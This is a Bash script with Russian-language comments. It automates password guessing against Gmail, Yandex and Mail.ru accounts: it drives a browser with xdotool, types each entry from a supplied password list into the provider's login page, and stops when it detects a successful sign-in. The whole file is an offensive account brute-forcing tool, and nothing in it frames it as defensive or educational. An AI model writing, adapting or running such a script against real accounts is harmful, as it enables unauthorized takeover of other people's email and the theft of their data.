#!/bin/bash

# Проверка наличия необходимых аргументов
if [ "$#" -ne 3 ]; then
    echo "Использование: $0 <email> <path_to_passwords_file> <browser>"
    exit 1
fi

EMAIL="$1"
PASSWORDS_FILE="$2"
BROWSER="$3"

# Проверка существования файла с паролями
if [ ! -f "$PASSWORDS_FILE" ]; then
    echo "Файл с паролями не найден: $PASSWORDS_FILE"
    exit 1
fi

# Определение сервиса по домену почты
DOMAIN=$(echo "$EMAIL" | awk -F'@' '{print $2}')

case "$DOMAIN" in
    "gmail.com" | "googlemail.com")
        LOGIN_URL="https://accounts.google.com/signin"
        SUCCESS_URL="myaccount.google.com"
        ;;
    "yandex.ru" | "yandex.com")
        LOGIN_URL="https://passport.yandex.ru/auth"
        SUCCESS_URL="passport.yandex.ru/profile"
        ;;
    "mail.ru")
        LOGIN_URL="https://e.mail.ru/login"
        SUCCESS_URL="e.mail.ru/messages"
        ;;
    *)
        echo "Неподдерживаемый домен почты: $DOMAIN"
        exit 1
        ;;
esac

# Открытие браузера и переход на страницу входа
"$BROWSER" "$LOGIN_URL" &

# Ожидание загрузки страницы
sleep 5

# Чтение паролей из файла и попытка входа
while IFS= read -r password; do
    echo "Пробую пароль: $password"
    
    # Открытие новой вкладки
    xdotool key ctrl+t
    sleep 1
    
    # Переход на страницу входа
    xdotool type "$LOGIN_URL"
    xdotool key Return
    sleep 5
    
    # Ввод email и нажатие Enter
    xdotool type "$EMAIL"
    xdotool key Return
    sleep 3
    
    # Ввод пароля и нажатие Enter
    xdotool type "$password"
    xdotool key Return
    
    # Ожидание загрузки новой страницы
    sleep 5
    
    # Получение текущего URL
    CURRENT_URL=$(xdotool getactivewindow getwindowname | grep -oP 'https://\S+')
    
    # Проверка успешности входа
    if [[ $CURRENT_URL == *"$SUCCESS_URL"* ]]; then
        echo "Успешный вход с паролем: $password"
        exit 0
    fi
    
    # Закрытие текущей вкладки
    xdotool key ctrl+w
    sleep 1
done < "$PASSWORDS_FILE"

echo "Пароль не найден."
exit 1
